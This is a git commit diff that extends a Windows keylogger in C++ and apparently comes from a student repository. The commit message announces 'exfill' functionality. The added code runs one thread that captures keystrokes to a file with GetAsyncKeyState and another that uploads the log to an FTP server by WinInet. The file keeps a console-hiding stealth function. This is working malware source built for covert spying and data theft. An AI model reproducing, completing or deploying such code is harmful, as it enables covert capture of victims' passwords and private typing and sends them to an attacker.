46eef4ef900f17bd714c41d75834a01b67de417f
Nick Anderson <nba237@nyu.edu>
2014-09-19 13:57:26 -0400

    Updated keylogger.cpp
    Added exfill functionality.  Keylogger will now occasionally upload the
    logged file to an anonymous FTP server.  This must be set before
    compiling.
    TODO: Have the FTP information pulled from the cmd line.

--- keylogger_win/keylogger/keylogger.cpp
+++ keylogger_win/keylogger/keylogger.cpp
@@ -1,20 +1,103 @@
 // Original Code obtained from: http://codecompiler.wordpress.com/2012/08/15/how-to-create-keylogger-using-c/
 
 /*
+	KeyLogger
 
-	This is a very naive approach to making a Windows Keylogger.  At this point
-	there is no case support, and very little support for special key strokes, 
-	such as ret, shift, ctrl, etc...
+	This application creates two threads, the first is a keylogger that
+	writes the captured keys to a file on the disk
 
-	Keystrokes are saved to .\keys.txt
-
+	The second thread uploads the keylogger file to an FTP server, deletes
+	the old keylogger file, and then creates a new file name based off of
+	the current Unix time since Epoch.
 */
 
 #include <iostream>
 #include <windows.h>
+#include <WinInet.h>
+#include <process.h>
+#include <ctime>
+#include <string>
 
+#pragma comment( lib, "wininet" )
+
+#define FTP_SERVER L"127.0.0.1"
+#define FTP_USER L"anonymous"
+#define FTP_PASS L""
+
+std::string fname;
+// Mutex for doing thangs to our key log file
+HANDLE hIOMutex = CreateMutex(NULL, FALSE, NULL); 
+
+/* Function definitions */
 int write( int key_stroke );
+void FileSubmit(LPCWSTR* source, LPCWSTR* dest);
+void hide();
+void uploader(void*);
+void keylogger(void*);
+std::wstring s2ws(const std::string&);
+ 
 
+/* Main :P */
+int main( int argc, char* argv[] ){
+	time_t t;
+	//hide();
+	srand( (unsigned)time(NULL) );
+	t = time(0);
+	fname = ".\\keys_" + std::to_string(t) + ".txt"; // make an initial filename
+	
+	/* Create a thread for the uploader and a thread for the keylogger */
+	_beginthread(keylogger, 0, NULL);
+	_beginthread(uploader, 0, NULL);
+
+	return 0;
+}
+
+
+/* Function to upload the files every now and again */
+void uploader(void* parg){
+
+	// Sleep time should be 1 to 5 minutes.
+	//unsigned int t_sleep = rand() % 30000 + 6000;
+	unsigned int t_sleep = rand() % 1000 + 100; // For debugging we do 1 to 10 seconds.
+	time_t t_stamp = time(0);
+	WaitForSingleObject( hIOMutex, INFINITE);
+	
+	/* Upload the file */
+	std::wstring stemp = s2ws(fname);
+	FileSubmit( (LPCWSTR*)stemp.c_str(), (LPCWSTR*)stemp.c_str() );
+	
+	/* Create a new file name */
+	std::string nfname = ".\\keys_" + std::to_string(t_stamp) + ".txt";
+
+	/* Delete the old file */
+	int ret = DeleteFile((LPCTSTR)fname.c_str());
+	if(ret == 0){
+		std::cout << "Error deleting file: " << GetLastError() << std::endl;
+	}
+	fname = nfname.c_str(); // Force a deep copy of the global filename.
+
+	/* Release the Mutex */
+	ReleaseMutex( hIOMutex );
+
+	/* Sleep */
+	Sleep(t_sleep);
+}
+
+
+/* main functionality for the keylogger */
+ void keylogger(void * parg){
+	while (1){
+		/* Get keys and write them */
+		for(unsigned char key = 8; key <= 190; key++){
+			if (GetAsyncKeyState(key) == -32767){
+				write (key);
+			}
+		}
+	}
+}
+
+
+/* Function to hide the console window */
 void hide(){
 	HWND Stealth;
 	AllocConsole();
@@ -22,21 +105,20 @@ void hide(){
 	ShowWindow(Stealth,0);
 }
 
- 
-int main( int argc, char* argv[] ){
-	unsigned char key;
-	hide();
-	while (1)
-	{
-		for(key = 8; key <= 190; key++){
-			if (GetAsyncKeyState(key) == -32767){
-				write (key);
-			}
+/* Function to upload a file to an anonymous FTP server */
+void FileSubmit(LPCWSTR* source, LPCWSTR* dest){
+	HINTERNET hInternet;
+	HINTERNET hFtpSession;
+	hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+	if(hInternet != NULL){
+		hFtpSession = InternetConnect(hInternet, FTP_SERVER, INTERNET_DEFAULT_FTP_PORT, FTP_USER, FTP_PASS, INTERNET_SERVICE_FTP, 0, 0);
+		if(hFtpSession != NULL){
+			FtpPutFile(hFtpSession, *source, *dest, FTP_TRANSFER_TYPE_BINARY, 0);
 		}
 	}
-	return 0;
 }
 
+/* Function to write out the keystroke to a file. */
 int write(int key_stroke){
 
 	if ( (key_stroke == 1) || (key_stroke == 2) )
@@ -44,8 +126,8 @@ int write(int key_stroke){
  
 	int e;
 	FILE *fout;
-
-	e = fopen_s(&fout, "keys.txt", "a+");
+	WaitForSingleObject( hIOMutex, INFINITE);
+	e = fopen_s(&fout, fname.c_str(), "a+");
 	if(e)	// If the file can't be opened, a ret code is stashed in e.
 		return 0;
  
@@ -81,6 +163,21 @@ int write(int key_stroke){
 		fprintf(fout, "%s", &key_stroke);
 	fflush(fout);
 	fclose (fout);
+	ReleaseMutex( hIOMutex );
 	return 0;
 }
  
+
+/* Used to convert a string to a wstring, so we can pass a
+   LPCWSTR pointer to the file upload function */
+std::wstring s2ws(const std::string& s)
+{
+    int len;
+    int slength = (int)s.length() + 1;
+    len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0); 
+    wchar_t* buf = new wchar_t[len];
+    MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
+    std::wstring r(buf);
+    delete[] buf;
+    return r;
+}
